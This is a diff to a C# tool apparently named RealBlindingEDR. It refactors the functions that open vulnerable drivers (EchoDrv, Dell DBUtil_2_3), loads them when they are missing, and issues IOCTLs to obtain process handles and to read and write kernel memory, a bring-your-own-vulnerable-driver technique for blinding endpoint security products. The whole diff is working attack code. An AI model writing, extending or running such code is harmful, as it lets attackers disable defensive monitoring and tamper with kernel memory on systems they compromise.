@@ -4,6 +4,7 @@ using System.Text;
 using System.Diagnostics;
 using Microsoft.Win32;
 using System.ComponentModel;
+using System.Collections.Generic;
 
 namespace RealBlindingEDR
 {
@@ -239,75 +240,81 @@ namespace RealBlindingEDR
         // Initialize the driver
         private static bool InitialDriver()
         {
-            if (DriverType == 1)
+            switch (DriverType)
             {
-                hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-                if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
-                {
-                    if (LoadDriver())
+                case 1:
+                    hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                    if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
                     {
-                        Console.WriteLine("Driver loaded successfully.");
-                        hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                        if (LoadDriver())
+                        {
+                            Console.WriteLine("Driver loaded successfully.");
+                            hDevice = CreateFile("\\\\.\\EchoDrv", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                        }
+                        else
+                        {
+                            Console.WriteLine("Driver loading failed.");
+                            return false;
+                        }
                     }
-                    else
+
+                    IntPtr buf = Marshal.AllocHGlobal(4096);
+                    uint bytesRet = 0;
+                    bool success = DeviceIoControl(hDevice, IOCTL_ECHO_HELLO, IntPtr.Zero, 0, buf, 4096, out bytesRet, IntPtr.Zero);
+                    if (!success)
                     {
-                        Console.WriteLine("Driver loading failed.");
+                        Console.WriteLine($"Failed to initialize driver 1, {Marshal.GetLastWin32Error()}");
+                        CloseHandle(hDevice);
+                        Marshal.FreeHGlobal(buf);
                         return false;
                     }
-                }
 
-                IntPtr buf = Marshal.AllocHGlobal(4096);
-                uint bytesRet = 0;
-                bool success = DeviceIoControl(hDevice, IOCTL_ECHO_HELLO, IntPtr.Zero, 0, buf, 4096, out bytesRet, IntPtr.Zero);
-                if (!success)
-                {
-                    Console.WriteLine($"Failed to initialize driver 1, {Marshal.GetLastWin32Error()}");
-                    CloseHandle(hDevice);
-                    Marshal.FreeHGlobal(buf);
-                    return false;
-                }
+                    GetHandle param = new GetHandle
+                    {
+                        pid = (uint)Process.GetCurrentProcess().Id,
+                        access = GENERIC_READ | GENERIC_WRITE
+                    };
 
-                GetHandle param = new GetHandle
-                {
-                    pid = (uint)Process.GetCurrentProcess().Id,
-                    access = GENERIC_READ | GENERIC_WRITE
-                };
+                    IntPtr paramPtr = Marshal.AllocHGlobal(Marshal.SizeOf(param));
+                    Marshal.StructureToPtr(param, paramPtr, false);
 
-                IntPtr paramPtr = Marshal.AllocHGlobal(Marshal.SizeOf(param));
-                Marshal.StructureToPtr(param, paramPtr, false);
+                    success = DeviceIoControl(hDevice, IOCTL_ECHO_GET_HANDLE, paramPtr, (uint)Marshal.SizeOf(param), paramPtr, (uint)Marshal.SizeOf(param), out bytesRet, IntPtr.Zero);
+                    if (!success)
+                    {
+                        Console.WriteLine($"Failed to initialize driver 2, {Marshal.GetLastWin32Error()}");
+                        CloseHandle(hDevice);
+                        Marshal.FreeHGlobal(paramPtr);
+                        Marshal.FreeHGlobal(buf);
+                        return false;
+                    }
 
-                success = DeviceIoControl(hDevice, IOCTL_ECHO_GET_HANDLE, paramPtr, (uint)Marshal.SizeOf(param), paramPtr, (uint)Marshal.SizeOf(param), out bytesRet, IntPtr.Zero);
-                if (!success)
-                {
-                    Console.WriteLine($"Failed to initialize driver 2, {Marshal.GetLastWin32Error()}");
-                    CloseHandle(hDevice);
+                    param = (GetHandle)Marshal.PtrToStructure(paramPtr, typeof(GetHandle));
+                    Process = param.handle;
+
                     Marshal.FreeHGlobal(paramPtr);
                     Marshal.FreeHGlobal(buf);
+                    break;
+                    
+                case 2:
+                    hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                    if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
+                    {
+                        if (LoadDriver())
+                        {
+                            Console.WriteLine("Driver loaded successfully.");
+                            hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                        }
+                        else
+                        {
+                            Console.WriteLine("Driver loading failed.");
+                            return false;
+                        }
+                    }
+                    break;
+                    
+                default:
+                    Console.WriteLine("Invalid driver type specified.");
                     return false;
-                }
-
-                param = (GetHandle)Marshal.PtrToStructure(paramPtr, typeof(GetHandle));
-                Process = param.handle;
-
-                Marshal.FreeHGlobal(paramPtr);
-                Marshal.FreeHGlobal(buf);
-            }
-            else if (DriverType == 2)
-            {
-                hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-                if (hDevice == IntPtr.Zero || hDevice == new IntPtr(-1))
-                {
-                    if (LoadDriver())
-                    {
-                        Console.WriteLine("Driver loaded successfully.");
-                        hDevice = CreateFile("\\\\.\\DBUtil_2_3", GENERIC_WRITE | GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
-                    }
-                    else
-                    {
-                        Console.WriteLine("Driver loading failed.");
-                        return false;
-                    }
-                }
             }
             return true;
         }
@@ -371,50 +378,56 @@ namespace RealBlindingEDR
         // Write memory using driver
         private static void DriverWriteMemery(IntPtr fromAddress, IntPtr toAddress, UIntPtr len)
         {
-            if (DriverType == 1)
+            switch (DriverType)
             {
-                ReadMem req = new ReadMem
-                {
-                    fromAddress = fromAddress,
-                    length = len,
-                    targetProcess = Process,
-                    toAddress = toAddress,
-                    padding = IntPtr.Zero,
-                    returnCode = 0
-                };
-
-                IntPtr reqPtr = Marshal.AllocHGlobal(Marshal.SizeOf(req));
-                Marshal.StructureToPtr(req, reqPtr, false);
-
-                uint bytesRet = 0;
-                bool success = DeviceIoControl(hDevice, IOCTL_ECHO_MEMCPY, reqPtr, (uint)Marshal.SizeOf(req), reqPtr, (uint)Marshal.SizeOf(req), out bytesRet, IntPtr.Zero);
-                if (!success)
-                {
-                    Console.WriteLine("Memory read failed.");
-                    CloseHandle(hDevice);
-                    Marshal.FreeHGlobal(reqPtr);
-                    return;
-                }
-
-                Marshal.FreeHGlobal(reqPtr);
-            }
-            else if (DriverType == 2)
-            {
-                if (len.ToUInt64() == 8)
-                {
-                    long dataAddr = (long)DellRead(fromAddress);
-                    DellWrite(toAddress, dataAddr);
-                }
-                else
-                {
-                    byte[] buffer = new byte[len.ToUInt32()];
-                    for (int i = 0; i < len.ToUInt32(); i++)
+                case 1:
+                    ReadMem req = new ReadMem
                     {
-                        IntPtr addr = new IntPtr(fromAddress.ToInt64() + i);
-                        buffer[i] = (byte)DellRead(addr);
+                        fromAddress = fromAddress,
+                        length = len,
+                        targetProcess = Process,
+                        toAddress = toAddress,
+                        padding = IntPtr.Zero,
+                        returnCode = 0
+                    };
+
+                    IntPtr reqPtr = Marshal.AllocHGlobal(Marshal.SizeOf(req));
+                    Marshal.StructureToPtr(req, reqPtr, false);
+
+                    uint bytesRet = 0;
+                    bool success = DeviceIoControl(hDevice, IOCTL_ECHO_MEMCPY, reqPtr, (uint)Marshal.SizeOf(req), reqPtr, (uint)Marshal.SizeOf(req), out bytesRet, IntPtr.Zero);
+                    if (!success)
+                    {
+                        Console.WriteLine("Memory read failed.");
+                        CloseHandle(hDevice);
+                        Marshal.FreeHGlobal(reqPtr);
+                        return;
                     }
-                    Marshal.Copy(buffer, 0, toAddress, (int)len.ToUInt32());
-                }
+
+                    Marshal.FreeHGlobal(reqPtr);
+                    break;
+                    
+                case 2:
+                    if (len.ToUInt64() == 8)
+                    {
+                        long dataAddr = (long)DellRead(fromAddress);
+                        DellWrite(toAddress, dataAddr);
+                    }
+                    else
+                    {
+                        byte[] buffer = new byte[len.ToUInt32()];
+                        for (int i = 0; i < len.ToUInt32(); i++)
+                        {
+                            IntPtr addr = new IntPtr(fromAddress.ToInt64() + i);
+                            buffer[i] = (byte)DellRead(addr);
+                        }
+                        Marshal.Copy(buffer, 0, toAddress, (int)len.ToUInt32());
+                    }
+                    break;
+                    
+                default:
+                    Console.WriteLine("Invalid driver type specified.");
+                    break;
             }
         }
 
